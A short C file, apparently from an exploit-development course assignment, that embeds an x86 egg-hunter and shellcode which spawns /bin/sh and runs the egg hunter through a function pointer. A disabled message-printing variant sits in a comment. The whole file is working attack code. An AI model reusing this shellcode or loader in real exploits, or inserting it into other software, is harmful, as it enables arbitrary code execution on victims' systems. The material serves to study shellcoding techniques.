#include<stdio.h>
#include<string.h>

unsigned char egg_hunter[] = \
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x5e\x31\xc0\xb0\x1f\x01\xc6\xba\x60\x67\x67\x65\xc1\xc2\x04\x83\xc6\x04\x39\x16\x74\xf9\xff\xd6";
unsigned char shell_code[] = \
"\x31\xc0\xb0\x05\xfe\xc0\xfe\xc8\xb0\x06\x90" //dum instruction
"\x06\x76\x76\x56" // egg id reversed
//shellcode:print a message
//"\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x16\xcd\x80\x31\xc0\xb0\x01\xb3\x01\xcd\x80\xe8\xe4\xff\xff\xff\x41\x73\x73\x69\x67\x6e\x6d\x65\x6e\x23\x33\x20\x63\x6f\x6d\x70\x6c\x65\x74\x65\x64";
//shellcode: spawn a shell
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; // /bin/bash
main()
{
        printf("Egg hunter length:  %d\n", strlen(egg_hunter));
	printf("Total length: %d\n", strlen(egg_hunter)+strlen(shell_code));
        int (*ret)() = (int(*)())egg_hunter;
        ret();
}
